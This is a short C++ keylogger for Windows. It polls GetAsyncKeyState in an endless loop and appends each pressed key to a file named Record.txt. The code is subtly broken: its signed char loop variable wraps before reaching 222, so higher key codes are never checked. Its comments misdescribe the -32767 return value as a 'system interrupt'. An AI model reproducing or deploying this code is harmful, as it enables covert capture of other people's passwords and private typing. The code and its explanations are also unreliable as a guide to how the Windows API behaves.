#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

int main(void) {
    char character;

    for (;;) {
        for (character = 8; character <= 222; character++){
            /*
                 The range 8 to 222 covers a wide range of keys including:

                   - Numeric keys (0-9)
                   - Alphabet keys (A-Z)
                   - Function keys (F1-F12)
                   - Control keys (Shift, Ctrl, Alt, etc.)
                   - Punctuation keys and other special characters.
 
            */
            /*
                When a key is pressed there is a system interrupt 
                That interrupt can represent the number 
                i.e.; 32767
            */
            if (GetAsyncKeyState(character) == -32767) {
                std::ofstream write("Record.txt", std::ios::app); // Use std::ofstream and std::ios::app
                // ios::app ensures that the file is opened in append mode.
                write << character;
                write.close(); // Ensure the file is closed after each write operation
            }
        }
    }

    return 0;
}
